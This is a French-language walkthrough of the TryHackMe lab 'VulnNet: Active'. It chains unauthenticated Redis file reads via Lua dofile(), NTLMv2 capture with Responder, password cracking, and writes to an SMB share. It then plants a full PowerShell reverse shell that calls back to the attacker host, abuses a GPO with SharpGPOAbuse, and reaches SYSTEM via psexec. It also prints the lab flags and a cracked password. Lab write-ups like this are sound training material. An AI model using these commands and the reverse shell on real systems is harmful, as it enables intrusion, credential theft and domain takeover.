# TryHackMe: VulnNet: Active

**Objectif :** exploiter une instance Redis obsolete exposee sans authentification, faire fuiter le flag utilisateur via le moteur Lua, capturer puis casser le hash NTLMv2 du compte `enterprise-security`, reutiliser ses droits d'ecriture sur un partage SMB pour obtenir un shell PowerShell, puis elever les privileges jusqu'a `NT AUTHORITY\SYSTEM`.

---

## Introduction

La room **VulnNet: Active** est une machine Windows / AD tres interessante parce qu'elle demarre sur un service qu'on voit moins souvent comme point d'entree :

- **Redis 2.8.2402** sur Windows

La suite de la chaine est tout aussi instructive :

- lecture de fichier via `EVAL`
- capture NetNTLMv2 avec Responder
- cassage hors ligne
- reutilisation de credentials
- modification d'un script PowerShell partage
- abus d'une GPO pour finir admin local puis SYSTEM

Le chemin est tres propre et montre bien comment une petite exposition applicative peut entrainer une compromission complete d'un environnement Windows.

---

## Task 1: Deploy

### Question 1: Deploy the machine

Je deploie la machine et j'attends qu'elle soit disponible avant de lancer mes scans.

### Reponse

`Done`

---

## Enumeration initiale

Je commence par Nmap :

```bash
nmap -sC -sV -Pn -p- <IP>
```

Le scan fait ressortir plusieurs services typiques d'un hote Windows integre a un domaine :

- `53/tcp` - DNS
- `135/tcp` - MSRPC
- `139/tcp` - NetBIOS
- `445/tcp` - SMB
- `464/tcp` - kpasswd
- `6379/tcp` - Redis
- `9389/tcp` - .NET Message Framing
- plusieurs ports RPC supplementaires

Le service qui sort vraiment du lot est :

```text
Redis key-value store 2.8.2402
```

Je complete ensuite avec une enumeration SMB pour confirmer le contexte AD :

```bash
enum4linux-ng -A <IP>
```

Les informations retrouvees sont :

- domaine : `vulnnet.local`
- machine : `VULNNET-BC3TCK1`

---

## Redis: premiere fuite d'information

Je me connecte sans mot de passe :

```bash
redis-cli -h <IP> -p 6379
```

Puis je collecte des informations systeme :

```bash
INFO
CONFIG GET *
```

Le parametre `dir` est deja tres utile :

```text
C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402
```

Il revele l'utilisateur sous lequel Redis s'execute :

```text
enterprise-security
```

Ce simple detail suffit a orienter toute la suite.

---

## Lecture arbitraire de fichier via Lua

Les anciennes versions de Redis permettent de sortir du sandbox Lua avec `dofile()`. Sur Windows, cela permet de lire le debut de certains fichiers via les messages d'erreur.

Je valide d'abord la technique sur un fichier connu :

```bash
EVAL "dofile('C:/Windows/System32/drivers/etc/Hosts')" 0
```

Puis j'attaque directement le flag utilisateur :

```bash
EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
```

Redis renvoie une erreur du type :

```text
malformed number near '3eb176aee96432d5b100bc93580b291e'
```

En l'encapsulant dans `THM{}`, on obtient :

### Reponse

**user.txt:** `THM{3eb176aee96432d5b100bc93580b291e}`

Cette etape est importante : on n'a pas encore de shell, mais on a deja une lecture arbitraire d'un fichier sensible via un service de cache oublie.

---

## Capture du hash NTLMv2

Le prochain objectif est de faire authentifier la machine Windows vers notre box. Puisque Redis s'execute sous `enterprise-security`, si on le pousse a acceder a un partage SMB distant, Windows enverra automatiquement le challenge/response NTLMv2.

Je prepare un faux partage avec Responder :

```bash
sudo responder -I tun0 -dvw
```

Puis, dans Redis :

```bash
EVAL "dofile('//<MON_IP>/anything')" 0
```

Responder capture alors un hash du type :

```text
VULNNET\enterprise-security
```

Je sauvegarde ce hash et je le casse hors ligne.

### Crack avec John

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
```

Ou avec Hashcat :

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe retrouve est :

```text
sand_0873959498
```

---

## Enumeration SMB authentifiee

Je peux maintenant reutiliser ces credentials pour regarder les partages :

```bash
smbmap -H <IP> -u enterprise-security -p 'sand_0873959498'
```

Le partage vraiment utile est :

```text
Enterprise-Share
```

Je m'y connecte :

```bash
smbclient //"<IP>"/Enterprise-Share -U enterprise-security
```

Et j'y trouve notamment :

```text
PurgeIrrelevantData_1826.ps1
```

Le script est un excellent candidat pour un foothold, surtout si nous avons les droits d'ecriture sur le share.

---

## Foothold: PowerShell reverse shell

Je verifie que le share est modifiable puis je remplace le contenu de `PurgeIrrelevantData_1826.ps1` par une charge PowerShell reverse shell.

Exemple de payload :

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<MON_IP>',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Je prepare mon listener :

```bash
rlwrap nc -lvnp 1337
```

Puis j'attends le prochain lancement du script. Comme il est execute regulierement, je finis par obtenir un shell PowerShell :

```text
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
```

---

## Enumeration locale

Une fois dans le shell, le premier reflexe est :

```powershell
whoami /all
```

Plusieurs pistes ressortent a ce stade :

- `SeImpersonatePrivilege`
- et surtout des droits **GenericWrite** sur la GPO `SECURITY-POL-VN`

Pour verifier proprement ce second point, beaucoup d'auteurs utilisent **SharpHound** puis **BloodHound**.

Je transfere SharpHound :

```powershell
Invoke-WebRequest -Uri http://<MON_IP>/SharpHound.exe -OutFile C:\Users\enterprise-security\Desktop\SharpHound.exe
.\SharpHound.exe --CollectionMethods All --Domain vulnnet.local --ExcludeDCs
```

Je recupere ensuite l'archive generee et je l'importe dans BloodHound.

Le graphe montre que `enterprise-security` a bien un droit **GenericWrite** sur :

```text
SECURITY-POL-VN
```

---

## Privilege Escalation: SharpGPOAbuse

Plutot que de s'acharner sur une autre technique locale, j'abuse directement la GPO.

La commande la plus propre ici est :

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "PrivEsc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

Une autre variante valide est :

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount enterprise-security --GPOName "SECURITY-POL-VN"
```

Ensuite :

```powershell
gpupdate /force
net user enterprise-security
```

Je verifie ensuite que l'utilisateur apparait bien dans le groupe local :

```text
Administrators
```

---

## Shell SYSTEM et flag final

Maintenant que `enterprise-security` est admin local, je peux utiliser Impacket :

```bash
psexec.py enterprise-security:'sand_0873959498'@<IP>
```

Ou, selon la methode alternative retenue dans certains writeups, `adm1n:P@ssw0rd` si l'auteur a passe par PrintNightmare. Ici, je reste sur la voie `enterprise-security`, plus cohérente avec le chemin GPO abuse deja documenté.

Une fois le shell obtenu :

```text
whoami
nt authority\system
```

Je lis le flag final :

```powershell
type C:\Users\Administrator\Desktop\system.txt
```

### Reponse

**system.txt:** `THM{d540c0645975900e5bb9167aa431fc9b}`

---

## Resume des reponses et artefacts importants

- Domaine : `vulnnet.local`
- Utilisateur revele par Redis : `enterprise-security`
- user.txt : `THM{3eb176aee96432d5b100bc93580b291e}`
- Share SMB utile : `Enterprise-Share`
- Script abuse : `PurgeIrrelevantData_1826.ps1`
- Credential cracke : `sand_0873959498`
- GPO abusee : `SECURITY-POL-VN`
- system.txt : `THM{d540c0645975900e5bb9167aa431fc9b}`

---

## Commandes importantes

### Enumeration Redis

```bash
redis-cli -h <IP> -p 6379
INFO
CONFIG GET *
```

Permet de decouvrir le contexte Windows et l'utilisateur `enterprise-security`.

### Lecture du flag utilisateur

```bash
EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
```

Donne la valeur utile via le message d'erreur.

### Capture NetNTLMv2

```bash
sudo responder -I tun0 -dvw
EVAL "dofile('//<MON_IP>/anything')" 0
```

Transforme Redis en point d'emission d'une authentification Windows.

### Enumeration SMB authentifiee

```bash
smbmap -H <IP> -u enterprise-security -p 'sand_0873959498'
```

Fait apparaitre `Enterprise-Share`.

### GPO abuse

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "PrivEsc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

Transforme un droit AD discret en admin local.

### Shell final

```bash
psexec.py enterprise-security:'sand_0873959498'@<IP>
```

Donne l'acces SYSTEM.

---

## Conclusion

**VulnNet: Active** montre tres bien qu'une compromission complete peut partir d'un service de cache oublie. Redis donne une fuite de fichier, cette fuite mene a un hash, le hash mene a SMB, SMB mene a PowerShell, puis l'AD mal delegue fait le reste.

***Auteur*** *: Saad Idrissi*
